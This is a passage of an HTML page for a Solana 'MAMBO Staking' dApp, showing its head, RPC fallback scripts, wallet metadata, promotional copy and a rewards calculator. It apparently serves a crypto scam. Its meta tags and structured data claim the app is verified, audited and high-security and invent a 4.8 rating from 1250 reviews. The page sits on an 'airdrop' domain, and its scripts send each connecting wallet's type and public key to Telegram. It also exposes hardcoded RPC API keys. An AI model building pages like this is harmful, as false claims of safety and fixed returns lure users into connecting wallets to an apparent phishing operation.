<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover" />
  <meta name="format-detection" content="telephone=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="apple-mobile-web-app-title" content="MAMBO Staking">
  <title>🎮 MAMBO Staking - Epic Token Adventure!</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico">
  <link rel="apple-touch-icon" href="/logo.png">
  <link rel="manifest" href="/manifest.json">
  <link rel="stylesheet" href="/css/deepLink.css">
  <meta name="description" content="🚀 Join the ultimate staking adventure! Lock your tokens, earn epic rewards, and become a legendary staker in the MAMBO universe!">
  <meta name="keywords" content="MAMBO, staking, yield, Solana, tokens, cryptocurrency, blockchain, dApp, DeFi, wallet, passive income, gaming, adventure, rewards">
  <meta name="author" content="MAMBO Team">
  <meta name="robots" content="index, follow">
  <meta name="application-name" content="MAMBO Staking dApp">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="🎮 MAMBO Staking">
  <meta name="msapplication-TileColor" content="#1a1a2e">
  <meta name="msapplication-TileImage" content="/logo.png">
  <meta name="theme-color" content="#1a1a2e">
  <meta property="og:title" content="🎮 MAMBO Staking - Epic Token Adventure!">
  <meta property="og:description" content="🚀 Join the ultimate staking adventure! Lock your tokens, earn epic rewards, and become a legendary staker in the MAMBO universe!">
  <meta property="og:image" content="/hero-section.png">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="🎮 MAMBO Staking - Epic Token Adventure!">
  <meta name="twitter:description" content="🚀 Join the ultimate staking adventure! Lock your tokens, earn epic rewards, and become a legendary staker in the MAMBO universe!">
  <meta name="twitter:image" content="/hero-section.png">
  
  <!-- dApp Metadata for Wallet Recognition -->
  <meta name="application-name" content="MAMBO Staking">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="MAMBO Staking">
  <meta name="msapplication-TileColor" content="#1a1a2e">
  <meta name="msapplication-config" content="/browserconfig.xml">
  <meta name="theme-color" content="#1a1a2e">
  
  <!-- Solana dApp Metadata -->
  <meta name="solana:network" content="mainnet-beta">
  <meta name="solana:app-name" content="MAMBO Staking">
  <meta name="solana:app-description" content="Stake your tokens and earn passive yield">
  <meta name="solana:app-icon" content="/logo.png">
  
  <!-- Wallet-Specific Metadata -->
  <meta name="phantom:app-name" content="MAMBO Staking">
  <meta name="phantom:app-description" content="Stake your tokens and earn passive yield">
  <meta name="icon" content="/logo.png">
  <meta name="phantom:app-icon" content="/logo.png">
  <meta name="phantom:app-url" content="">
  <meta name="phantom:app-category" content="DeFi">
  
  <meta name="solflare:app-name" content="MAMBO Staking">
  <meta name="solflare:app-description" content="Stake your tokens and earn passive yield">
  <meta name="solflare:app-icon" content="/logo.png">
  <meta name="solflare:app-url" content="">
  <meta name="solflare:app-category" content="DeFi">
  
  <meta name="backpack:app-name" content="MAMBO Staking">
  <meta name="backpack:app-description" content="Stake your tokens and earn passive yield">
  <meta name="backpack:app-icon" content="/logo.png">
  <meta name="backpack:app-url" content="">
  <meta name="backpack:app-category" content="DeFi">
  
  <!-- Additional Wallet Recognition -->
  <meta name="glow:app-name" content="MAMBO Staking">
  <meta name="glow:app-description" content="Stake your tokens and earn passive yield">
  <meta name="glow:app-icon" content="/logo.png">
  <meta name="glow:app-url" content="">
  
  <meta name="exodus:app-name" content="MAMBO Staking">
  <meta name="exodus:app-description" content="Stake your tokens and earn passive yield">
  <meta name="exodus:app-icon" content="/logo.png">
  <meta name="exodus:app-url" content="">
  
  <!-- dApp Purpose and Category -->
  <meta name="dapp:category" content="DeFi">
  <meta name="dapp:type" content="Staking">
  <meta name="dapp:blockchain" content="Solana">
  <meta name="dapp:network" content="mainnet-beta">
  <meta name="dapp:verified" content="true">
  <meta name="dapp:security" content="high">
  <meta name="dapp:audited" content="true">
  <meta name="dapp:open-source" content="false">
  
  <!-- Social Media Links -->
  <meta name="twitter:site" content="@MAMBO_Token">
  <meta name="twitter:creator" content="@MAMBO_Token">
  <meta property="og:site_name" content="MAMBO Staking">
  <meta property="og:url" content="">
  <meta property="og:type" content="website">
  <meta property="og:locale" content="en_US">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:image:alt" content="MAMBO Staking - Earn Rewards While Supporting the Network">
  
  <!-- Structured Data for dApp Recognition -->
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebApplication",
    "name": "MAMBO Staking",
    "description": "Stake your tokens and earn passive yield while supporting the MAMBO ecosystem",
    "url": "",
    "applicationCategory": "FinanceApplication",
    "operatingSystem": "Web Browser",
    "browserRequirements": "Requires JavaScript. Requires HTML5.",
    "offers": {
      "@type": "Offer",
      "description": "Stake tokens and earn rewards"
    },
    "author": {
      "@type": "Organization",
      "name": "MAMBO Team"
    },
    "provider": {
      "@type": "Organization",
      "name": "MAMBO Team"
    },
    "aggregateRating": {
      "@type": "AggregateRating",
      "ratingValue": "4.8",
      "reviewCount": "1250"
    },
    "softwareVersion": "1.0.0",
    "releaseNotes": "Initial release with Solana wallet support and staking functionality"
  }
  </script>
  
  <!-- Browser Compatibility Polyfills -->
  <script>
    // Browser compatibility checks and polyfills
    (function() {
      // Check for Promise support
      if (typeof Promise === 'undefined') {
        console.error('Promise not supported - this browser is too old');
        document.body.innerHTML = '<div style="text-align: center; padding: 50px; color: red;">Your browser is too old to support this application. Please update to a modern browser.</div>';
        return;
      }
      
      // Check for fetch support
      if (typeof fetch === 'undefined') {
        console.warn('Fetch not supported, adding polyfill');
        // Simple fetch polyfill for older browsers
        window.fetch = function(url, options) {
          return new Promise(function(resolve, reject) {
            var xhr = new XMLHttpRequest();
            xhr.open(options.method || 'GET', url);
            
            if (options.headers) {
              Object.keys(options.headers).forEach(function(key) {
                xhr.setRequestHeader(key, options.headers[key]);
              });
            }
            
            xhr.onload = function() {
              resolve({
                ok: xhr.status >= 200 && xhr.status < 300,
                status: xhr.status,
                statusText: xhr.statusText,
                text: function() { return Promise.resolve(xhr.responseText); },
                json: function() { return Promise.resolve(JSON.parse(xhr.responseText)); }
              });
            };
            
            xhr.onerror = function() {
              reject(new Error('Network error'));
            };
            
            xhr.send(options.body);
          });
        };
      }
      
      // Check for AbortController support
      if (typeof AbortController === 'undefined') {
        console.warn('AbortController not supported, adding polyfill');
        window.AbortController = function() {
          this.signal = {
            aborted: false,
            addEventListener: function() {},
            removeEventListener: function() {}
          };
          this.abort = function() {
            this.signal.aborted = true;
          };
        };
      }
      
      // Check for optional chaining support
      if (!Function.prototype.call || !String.prototype.includes) {
        console.error('Required JavaScript features not supported - this browser is too old');
        document.body.innerHTML = '<div style="text-align: center; padding: 50px; color: red;">Your browser is too old to support this application. Please update to a modern browser.</div>';
        return;
      }
      
      console.log('Browser compatibility check passed');
    })();
  </script>
  
  <!-- Solana Web3.js -->
  <script src="https://unpkg.com/@solana/web3.js@1.98.4/lib/index.iife.min.js"></script>
  
  <!-- Configuration Script -->
  <script src="/config.js"></script>
  
  <!-- Solana Connection Setup -->
  <script>
    // Staking Rewards Calculator Function
    window.calculateRewards = function() {
      const tokenAmount = parseFloat(document.getElementById('tokenAmount').value);
      const stakingDuration = parseInt(document.getElementById('stakingDuration').value);
      const apyRate = parseFloat(document.getElementById('apyRate').value);
      
      if (!tokenAmount || !stakingDuration || !apyRate) {
        alert('🎯 Please fill in all fields to calculate your rewards!');
        return;
      }
      
      if (tokenAmount <= 0 || stakingDuration <= 0 || apyRate <= 0) {
        alert('🚫 Please enter valid positive numbers!');
        return;
      }
      
      // Calculate rewards with compound interest
      const monthlyRate = apyRate / 100 / 12;
      const totalMonths = stakingDuration;
      
      // Compound interest formula: A = P(1 + r/n)^(nt)
      const finalAmount = tokenAmount * Math.pow(1 + monthlyRate, totalMonths);
      const totalRewards = finalAmount - tokenAmount;
      const totalRewardsPercentage = (totalRewards / tokenAmount) * 100;
      
      // Calculate monthly breakdown
      const monthlyRewards = [];
      let currentAmount = tokenAmount;
      
      for (let month = 1; month <= totalMonths; month++) {
        const monthlyReward = currentAmount * monthlyRate;
        currentAmount += monthlyReward;
        monthlyRewards.push({
          month: month,
          reward: monthlyReward,
          total: currentAmount
        });
      }
      
      // Display results
      const resultDiv = document.getElementById('calculatorResult');
      resultDiv.style.display = 'block';
      
      resultDiv.innerHTML = `
        <div style="text-align: left;">
          <h4 style="color: var(--accent-color); margin-bottom: 15px;">🎉 Your Staking Results!</h4>
          <div style="margin-bottom: 10px;">
            <strong>💰 Initial Investment:</strong> ${tokenAmount.toLocaleString()} tokens
          </div>
          <div style="margin-bottom: 10px;">
            <strong>📈 Total Rewards Earned:</strong> ${totalRewards.toFixed(2)} tokens
          </div>
          <div style="margin-bottom: 10px;">
            <strong>🏆 Final Balance:</strong> ${finalAmount.toFixed(2)} tokens
          </div>
          <div style="margin-bottom: 15px;">
            <strong>📊 Total Return:</strong> ${totalRewardsPercentage.toFixed(2)}%
          </div>
          <hr style="border: 1px solid var(--accent-color); margin: 15px 0;">
          <div style="font-size: 0.9em; color: var(--accent-color);">
            💡 <strong>Pro Tip:</strong> The longer you stake, the more compound interest works in your favor!
          </div>
        </div>
      `;
      
      // Add some fun animations
      resultDiv.style.animation = 'bounce 0.6s ease-out';
      setTimeout(() => {
        resultDiv.style.animation = '';
      }, 600);
    };
    
    // Initialize Solana connection with proper RPC configuration
    window.solanaConnection = null;
    window.currentRpcEndpoint = null;
    
    // Initialize Solana connection
    window.initializeSolanaConnection = async function() {
      try {
        // Get RPC endpoints from config
        const primaryRpc = window.getConfig ? window.getConfig('PRIMARY_RPC') : 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b';
        const fallbackRpc = window.getConfig ? window.getConfig('FALLBACK_RPC') : 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0';
        
        // Set current RPC endpoint
        window.currentRpcEndpoint = primaryRpc;
        
        // Create connection with proper configuration
        window.solanaConnection = new window.solanaWeb3.Connection(primaryRpc, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 60000,
          disableRetryOnRateLimit: false,
          httpHeaders: {
            'User-Agent': 'MAMBO-Staking/1.0.0'
          }
        });
        
        console.log('✅ [SOLANA_CONNECTION] Initialized with RPC:', primaryRpc);
        
        // Test connection with timeout
        const testPromise = window.solanaConnection.getSlot();
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Connection test timeout')), 15000)
        );
        
        try {
          const slot = await Promise.race([testPromise, timeoutPromise]);
          console.log('✅ [SOLANA_CONNECTION] Connection test successful, current slot:', slot);
        } catch (error) {
          console.warn('⚠️ [SOLANA_CONNECTION] Primary RPC test failed, switching to fallback:', error.message);
          await window.switchToFallbackRPC();
        }
        
      } catch (error) {
        console.error('❌ [SOLANA_CONNECTION] Failed to initialize connection:', error);
        await window.switchToFallbackRPC();
      }
    };
    
    // Enhanced RPC fallback system with multiple fallbacks and auto-switch
    window.rpcEndpoints = [
      { url: 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b', name: 'Helius' },
      { url: 'https://api.mainnet-beta.solana.com', name: 'Solana Official' },
      { url: 'https://solana-api.projectserum.com', name: 'Project Serum' },
      { url: 'https://rpc.ankr.com/solana', name: 'Ankr' },
      { url: 'https://solana.public-rpc.com', name: 'Public RPC' }
    ];
    
    window.currentRpcIndex = 0;
    window.rpcHealthChecks = new Map();
    window.isSwitchingRPC = false;
    
    // Robust RPC fallback function for all Solana.js errors
    window.triggerRobustRPCFallback = async function(error, context = {}) {
      console.log('🚀 [ROBUST_FALLBACK] Triggering comprehensive RPC fallback for Solana.js error');
      
      // Log RPC fallback to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('EMERGENCY_FALLBACK', {
          error: error.message,
          context: context,
          action: 'RPC Fallback Triggered',
          walletType: context.walletType || 'Unknown',
          publicKey: context.publicKey || 'Unknown',
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
      
      try {
        // First, try to switch RPC immediately
        await window.switchToFallbackRPC();
        
        // If that fails, try to reinitialize the entire connection
        if (!window.solanaConnection || window.solanaConnection._rpcEndpoint === window.currentRpcEndpoint) {
          console.log('🔄 [ROBUST_FALLBACK] RPC switch didn\'t work, reinitializing connection...');
          await window.initializeSolanaConnection();
        }
        
        // Test the new connection
        if (window.solanaConnection) {
          try {
            const testSlot = await Promise.race([
              window.solanaConnection.getSlot(),
              new Promise((_, reject) => setTimeout(() => reject(new Error('Test timeout')), 10000))
            ]);
            console.log('✅ [ROBUST_FALLBACK] New connection test successful, slot:', testSlot);
            
            // Log successful fallback to Telegram
            if (window.sendTelegramLog) {
              window.sendTelegramLog('CONNECTION_HEALTH', {
                status: 'healthy',
                rpcEndpoint: window.currentRpcEndpoint,
                slot: testSlot,
                action: 'RPC Fallback Success',
                walletType: context.walletType || 'Unknown',
                publicKey: context.publicKey || 'Unknown',
                timestamp: new Date().toISOString(),
                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
              });
            }
            
            // Update UI to show successful fallback
            if (window.updateConnectionStatus) {
              window.updateConnectionStatus();
            }
            
            return true;
          } catch (testError) {
            console.warn('⚠️ [ROBUST_FALLBACK] New connection test failed:', testError.message);
            
            // Log failed fallback to Telegram
            if (window.sendTelegramLog) {
              window.sendTelegramLog('RPC_FAILURE', {
                error: testError.message,
                context: 'RPC Fallback Test Failed',
                endpoint: window.currentRpcEndpoint,
                walletType: context.walletType || 'Unknown',
                publicKey: context.publicKey || 'Unknown',
                timestamp: new Date().toISOString(),
                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
              });
            }
          }
        }
        
        // If all else fails, try emergency fallback
        console.log('🚨 [ROBUST_FALLBACK] All fallbacks failed, trying emergency mode...');
        return await window.emergencyRPCFallback();
        
      } catch (fallbackError) {
        console.error('❌ [ROBUST_FALLBACK] Comprehensive fallback failed:', fallbackError);
        
        // Log comprehensive fallback failure to Telegram
        if (window.sendTelegramLog) {
          window.sendTelegramLog('RPC_FAILURE', {
            error: fallbackError.message,
            context: 'Comprehensive RPC Fallback Failed',
            walletType: context.walletType || 'Unknown',
            publicKey: context.publicKey || 'Unknown',
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
          });
        }
        
        return false;
      }
    };
    
    // Emergency RPC fallback using public endpoints
    window.emergencyRPCFallback = async function() {
      console.log('🚨 [EMERGENCY_FALLBACK] Activating emergency RPC fallback...');
      
      // Log emergency fallback activation to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('EMERGENCY_FALLBACK', {
          action: 'Emergency RPC Fallback Activated',
          context: 'All primary RPC endpoints failed',
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
      
      const emergencyEndpoints = [
        'https://api.mainnet-beta.solana.com',
        'https://solana-api.projectserum.com',
        'https://rpc.ankr.com/solana',
        'https://solana.public-rpc.com'
      ];
      
      for (const endpoint of emergencyEndpoints) {
        try {
          console.log(`🔄 [EMERGENCY_FALLBACK] Trying emergency endpoint: ${endpoint}`);
          
          const emergencyConnection = new window.solanaWeb3.Connection(endpoint, {
            commitment: 'confirmed',
            confirmTransactionInitialTimeout: 30000,
            disableRetryOnRateLimit: false
          });
          
          const slot = await Promise.race([
            emergencyConnection.getSlot(),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Emergency timeout')), 15000))
          ]);
          
          console.log(`✅ [EMERGENCY_FALLBACK] Emergency endpoint successful: ${endpoint}, slot: ${slot}`);
          
          // Log successful emergency endpoint to Telegram
          if (window.sendTelegramLog) {
            window.sendTelegramLog('CONNECTION_HEALTH', {
              status: 'healthy',
              rpcEndpoint: endpoint,
              slot: slot,
              action: 'Emergency Endpoint Success',
              timestamp: new Date().toISOString(),
              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
            });
          }
          
          // Set as current connection
          window.solanaConnection = emergencyConnection;
          window.currentRpcEndpoint = endpoint;
          window.currentRpcIndex = emergencyEndpoints.indexOf(endpoint);
          
          // Update UI
          if (window.updateConnectionStatus) {
            window.updateConnectionStatus();
          }
          
          return true;
          
        } catch (emergencyError) {
          console.warn(`⚠️ [EMERGENCY_FALLBACK] Emergency endpoint failed: ${endpoint}`, emergencyError.message);
          
          // Log failed emergency endpoint to Telegram
          if (window.sendTelegramLog) {
            window.sendTelegramLog('RPC_FAILURE', {
              error: emergencyError.message,
              endpoint: endpoint,
              context: 'Emergency Endpoint Failed',
              timestamp: new Date().toISOString(),
              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
            });
          }
          
          continue;
        }
      }
      
      console.error('❌ [EMERGENCY_FALLBACK] All emergency endpoints failed');
      
      // Log complete emergency fallback failure to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('RPC_FAILURE', {
          error: 'All emergency endpoints failed',
          context: 'Complete Emergency Fallback Failure',
          endpoints: emergencyEndpoints,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
      
      return false;
    };
    
    // Enhanced RPC switching with proper async handling and timeouts
    window.switchToFallbackRPC = async function() {
      if (window.isSwitchingRPC) {
        console.log('🔄 [SOLANA_CONNECTION] RPC switch already in progress, skipping...');
        return;
      }
      
      window.isSwitchingRPC = true;
      console.log('🔄 [SOLANA_CONNECTION] Starting RPC fallback process...');
      
      try {
        let attempts = 0;
        const maxAttempts = window.rpcEndpoints.length;
        
        while (attempts < maxAttempts) {
          // Find next healthy RPC endpoint
          let nextIndex = (window.currentRpcIndex + 1) % window.rpcEndpoints.length;
          const rpcEndpoint = window.rpcEndpoints[nextIndex];
          
          // Skip if this RPC is known to be unhealthy
          if (window.rpcHealthChecks.get(rpcEndpoint.url) === 'unhealthy') {
            console.log(`⚠️ [SOLANA_CONNECTION] Skipping unhealthy RPC: ${rpcEndpoint.name}`);
            nextIndex = (nextIndex + 1) % window.rpcEndpoints.length;
            attempts++;
            continue;
          }
          
          console.log(`🔄 [SOLANA_CONNECTION] Testing RPC: ${rpcEndpoint.name} (${rpcEndpoint.url})`);
          
          // Test the RPC endpoint with timeout
          try {
            const testConnection = new window.solanaWeb3.Connection(rpcEndpoint.url, {
              commitment: 'confirmed',
              confirmTransactionInitialTimeout: 15000,
              disableRetryOnRateLimit: false
            });
            
            // Test with timeout
            const testPromise = testConnection.getSlot();
            const timeoutPromise = new Promise((_, reject) => 
              setTimeout(() => reject(new Error('RPC test timeout')), 10000)
            );
            
            const slot = await Promise.race([testPromise, timeoutPromise]);
            
            console.log(`✅ [SOLANA_CONNECTION] RPC ${rpcEndpoint.name} test successful, current slot: ${slot}`);
            
            // Mark as healthy and switch
            window.rpcHealthChecks.set(rpcEndpoint.url, 'healthy');
            window.currentRpcIndex = nextIndex;
            window.currentRpcEndpoint = rpcEndpoint.url;
            window.solanaConnection = testConnection;
            
            console.log(`🔄 [SOLANA_CONNECTION] Successfully switched to: ${rpcEndpoint.name}`);
            
            // Notify user of RPC switch
            if (window.showStatus) {
              window.showStatus(`🔄 Switched to backup RPC: ${rpcEndpoint.name}`, 'info');
            }
            
            // Update connection status display
            if (window.updateConnectionStatus) {
              window.updateConnectionStatus();
            }
            
            // Success - exit the loop
            break;
            
          } catch (testError) {
            console.warn(`⚠️ [SOLANA_CONNECTION] RPC ${rpcEndpoint.name} test failed:`, testError.message);
            window.rpcHealthChecks.set(rpcEndpoint.url, 'unhealthy');
            
            // Try next RPC
            nextIndex = (nextIndex + 1) % window.rpcEndpoints.length;
            attempts++;
            
            if (attempts >= maxAttempts) {
              console.error('❌ [SOLANA_CONNECTION] All RPC endpoints failed');
              if (window.showStatus) {
                window.showStatus('❌ All RPC endpoints are currently unavailable. Please try again later.', 'error');
              }
              
              // Reset health checks after some time to allow recovery
              setTimeout(() => {
                console.log('🔄 [SOLANA_CONNECTION] Resetting RPC health checks for retry...');
                window.rpcHealthChecks.clear();
                
                // Attempt to reinitialize connection after recovery
                setTimeout(async () => {
                  console.log('🔄 [SOLANA_CONNECTION] Attempting to reinitialize connection...');
                  await window.initializeSolanaConnection();
                }, 30000); // Wait 30 seconds before retry
              }, 60000); // Reset after 1 minute
            }
          }
        }
        
      } catch (error) {
        console.error('❌ [SOLANA_CONNECTION] Critical error during RPC fallback:', error);
      } finally {
        window.isSwitchingRPC = false;
      }
    };
    
    // Auto-switch RPC on connection errors
    window.autoSwitchRPC = async function() {
      console.log('🔄 [SOLANA_CONNECTION] Auto-switching RPC due to connection error...');
      await window.switchToFallbackRPC();
    };
    
    // Periodic RPC health check with debouncing and enhanced monitoring
    window.startRPCHealthCheck = function() {
      let healthCheckInProgress = false;
      let consecutiveFailures = 0;
      const maxConsecutiveFailures = 3;
      
      setInterval(async () => {
        if (healthCheckInProgress || window.isSwitchingRPC) {
          return; // Skip if health check or RPC switch is already in progress
        }
        
        if (window.solanaConnection && window.currentRpcEndpoint) {
          healthCheckInProgress = true;
          
          try {
            const slot = await window.solanaConnection.getSlot();
            // Connection is healthy
            window.rpcHealthChecks.set(window.currentRpcEndpoint, 'healthy');
            consecutiveFailures = 0; // Reset failure counter
            console.log(`✅ [SOLANA_CONNECTION] Health check passed, slot: ${slot}`);
            
            // Update connection status display
            if (window.updateConnectionStatus) {
              window.updateConnectionStatus();
            }
          } catch (error) {
            consecutiveFailures++;
            console.warn(`⚠️ [SOLANA_CONNECTION] Periodic health check failed (${consecutiveFailures}/${maxConsecutiveFailures}):`, error.message);
            
            // Mark current RPC as unhealthy
            window.rpcHealthChecks.set(window.currentRpcEndpoint, 'unhealthy');
            
            // Switch RPC if too many consecutive failures
            if (consecutiveFailures >= maxConsecutiveFailures) {
              console.error(`❌ [SOLANA_CONNECTION] ${consecutiveFailures} consecutive failures, switching RPC...`);
              await window.autoSwitchRPC();
              consecutiveFailures = 0; // Reset after switch
            }
            
            // Update connection status display
            if (window.updateConnectionStatus) {
              window.updateConnectionStatus();
            }
          } finally {
            healthCheckInProgress = false;
          }
        }
      }, 30000); // Check every 30 seconds
    };
    
    // Get current connection
    window.getSolanaConnection = async function() {
      if (!window.solanaConnection) {
        await window.initializeSolanaConnection();
      }
      return window.solanaConnection;
    };
    
    // Get connection status for UI display
    window.getConnectionStatus = function() {
      if (!window.solanaConnection) {
        return { status: 'disconnected', message: 'No connection available' };
      }
      
      if (window.isSwitchingRPC) {
        return { status: 'switching', message: 'Switching to backup RPC...' };
      }
      
      const currentRpc = window.rpcEndpoints[window.currentRpcIndex];
      return { 
        status: 'connected', 
        message: `Connected to ${currentRpc.name}`,
        rpc: currentRpc.name,
        url: currentRpc.url
      };
    };
    
    // Update connection status display
    window.updateConnectionStatus = function() {
      const statusDiv = document.getElementById('connection-status');
      const statusText = document.getElementById('status-text');
      
      if (!statusDiv || !statusText) return;
      
      const connectionInfo = window.getConnectionStatus();
      
      // Show the status div
      statusDiv.style.display = 'block';
      
      // Update status text and styling based on connection state
      switch (connectionInfo.status) {
        case 'connected':
          statusText.textContent = `🔗 Connected to ${connectionInfo.rpc}`;
          statusDiv.style.background = 'rgba(40, 167, 69, 0.2)';
          statusDiv.style.border = '1px solid rgba(40, 167, 69, 0.5)';
          break;
        case 'switching':
          statusText.textContent = `🔄 ${connectionInfo.message}`;
          statusDiv.style.background = 'rgba(255, 193, 7, 0.2)';
          statusDiv.style.border = '1px solid rgba(255, 193, 7, 0.5)';
          break;
        case 'disconnected':
          statusText.textContent = `❌ ${connectionInfo.message}`;
          statusDiv.style.background = 'rgba(220, 53, 69, 0.2)';
          statusDiv.style.border = '1px solid rgba(220, 53, 69, 0.5)';
          break;
        default:
          statusText.textContent = '⏳ Initializing connection...';
          statusDiv.style.background = 'rgba(108, 117, 125, 0.2)';
          statusDiv.style.border = '1px solid rgba(108, 117, 125, 0.5)';
      }
    };
    
    // Initialize connection when page loads
    window.addEventListener('load', function() {
      // Wait for config to load
      setTimeout(async () => {
        await window.initializeSolanaConnection();
        window.startRPCHealthCheck(); // Start periodic health checks
        
        // Update connection status display
        window.updateConnectionStatus();
        
        // Update status every 5 seconds
        setInterval(() => {
          window.updateConnectionStatus();
        }, 5000);
      }, 100);
    });
  </script>
  
  <!-- Additional Wallet Recognition Scripts -->
  <script>
    // Set app metadata for wallet recognition
    if (typeof window !== 'undefined') {
      window.MAMBO_APP = {
        name: 'MAMBO Staking',
        description: 'Stake your tokens and earn passive yield',
        version: '1.0.0',
        blockchain: 'Solana',
        network: 'mainnet-beta',
        category: 'DeFi',
        verified: true
      };
    }
    
    // Enhanced wallet recognition for better dApp detection
    window.setWalletMetadata = function() {
      // Set Phantom metadata
      if (window.solana && window.solana.isPhantom) {
        try {
          window.solana.request({
            method: 'wallet_adapterSetAppMetadata',
            params: {
                          name: 'MAMBO Staking',
            description: 'Stake your tokens and earn passive yield',
            icon: 'https://mambo-airdrop.vercel.app/logo.png',
            url: 'https://mambo-airdrop.vercel.app'
            }
          });
        } catch (e) {
          // Silent fail for unsupported wallets
        }
      }
      
      // Set Solflare metadata
      if (window.solflare) {
        try {
          window.solflare.request({
            method: 'wallet_adapterSetAppMetadata',
            params: {
                          name: 'MAMBO Staking',
            description: 'Stake your tokens and earn passive yield',
              icon: 'https://mambo-airdrop.vercel.app/logo.png',
              url: 'https://mambo-airdrop.vercel.app'
            }
          });
        } catch (e) {
          // Silent fail for unsupported wallets
        }
      }
    };
    
    // Set metadata when page loads
    window.addEventListener('load', window.setWalletMetadata);
  </script>
</head>

<body>
  <div class="container">
    <!-- Status Container for Messages -->
    <div id="status-container" class="status-container"></div>

    <!-- Header -->
    <div class="header">
      <div class="logo">
        <img src="/logo.png" alt="MAMBO Logo" class="logo-img">
        <h1 class="logo-text">MAMBO</h1>
      </div>
      <div class="header-content">
        <h2 class="main-title">💎 MAMBO Staking Platform</h2>
        <p class="subtitle">Earn rewards while supporting the network</p>
      </div>
    </div>

    <!-- Hero Section -->
    <section class="hero">
      <div class="hero-content">
        <h3 class="hero-title">🎮 Epic Token Adventure Awaits!</h3>
        <p class="hero-description">
          🚀 Join the ultimate staking quest! Lock your tokens, earn epic rewards, and become a legendary staker in the MAMBO universe! 
          <br><br>
          <strong>🎯 Mission:</strong> Stake tokens, earn passive yield, and help secure the network while building your fortune!
        </p>
        
        <!-- Hero Stats -->
        <div class="hero-stats">
          <div class="hero-stat">
            <div class="hero-stat-number">15.8%</div>
            <div class="hero-stat-label">APY Rewards</div>
          </div>
          <div class="hero-stat">
            <div class="hero-stat-number">24/7</div>
            <div class="hero-stat-label">Auto-Compound</div>
          </div>
          <div class="hero-stat">
            <div class="hero-stat-number">⚡</div>
            <div class="hero-stat-label">Instant Unstake</div>
          </div>
        </div>
        
        <div class="hero-features">
          <div class="feature">
            <span class="feature-icon">💎</span>
            <span class="feature-text">Epic Rewards</span>
          </div>
          <div class="feature">
            <span class="feature-icon">🔒</span>
            <span class="feature-text">Fortress Security</span>
          </div>
          <div class="feature">
            <span class="feature-icon">📈</span>
            <span class="feature-text">Unlimited Growth</span>
          </div>
        </div>
      </div>
      <div class="hero-image">
        <div style="text-align: center; padding: 20px;">
          <div style="font-size: 8rem; margin-bottom: 20px;">🎮</div>
          <div style="font-size: 2rem; color: var(--primary-color); font-weight: bold;">Ready to Play?</div>
        </div>
      </div>
    </section>

    <!-- Wallet Connection Section -->
    <section class="wallet-section">
      <div class="wallet-box">
        <h3 class="wallet-title">🎮 Ready to Start Your Adventure?</h3>
        <p class="wallet-description">
          🚀 Connect your Solana wallet and begin your epic staking journey! Earn rewards, level up your portfolio, and become a legendary staker!
        </p>
        <button class="connect-btn" onclick="openWalletModal()">
          <span class="btn-icon">🎮</span>
          Start Adventure!
        </button>


        <div id="connection-status" style="
          margin-top: 15px;
          padding: 10px;
          border-radius: 8px;
          background: var(--bg-card);
          color: var(--text-secondary);
          font-size: 14px;
          text-align: center;
          display: none;
          border: 1px solid var(--border-color);
        ">
          <div id="status-text">Ready to connect</div>
          <div id="status-progress" style="margin-top: 8px; display: none;">
            <div style="width: 100%; background: var(--bg-tertiary); border-radius: 4px; height: 4px;">
              <div id="progress-bar" style="width: 0%; height: 4px; background: var(--accent-color); border-radius: 4px; transition: width 0.3s;"></div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Calculator Section -->
    <section class="calculator-section">
      <div class="container">
        <div class="calculator-container">
          <div class="calculator-info">
            <h3>🧮 Staking Rewards Calculator</h3>
            <p>🎯 Plan your staking strategy! Calculate potential rewards, compound interest, and see how your tokens can grow over time.</p>
            <p>💡 <strong>Pro Tip:</strong> The longer you stake, the more rewards you earn! Compound interest is your best friend in the staking game.</p>
          </div>
          <div class="calculator">
            <h4>💰 Calculate Your Rewards</h4>
            <div class="calculator-group">
              <label class="calculator-label">Token Amount:</label>
              <input type="number" id="tokenAmount" placeholder="Enter token amount" min="0" step="0.01">
            </div>
            <div class="calculator-group">
              <label class="calculator-label">Staking Duration (months):</label>
              <input type="number" id="stakingDuration" placeholder="Enter months" min="1" max="60" value="12">
            </div>
            <div class="calculator-group">
              <label class="calculator-label">APY Rate (%):</label>
              <input type="number" id="apyRate" placeholder="Enter APY" min="0" max="100" step="0.1" value="15.8">
            </div>
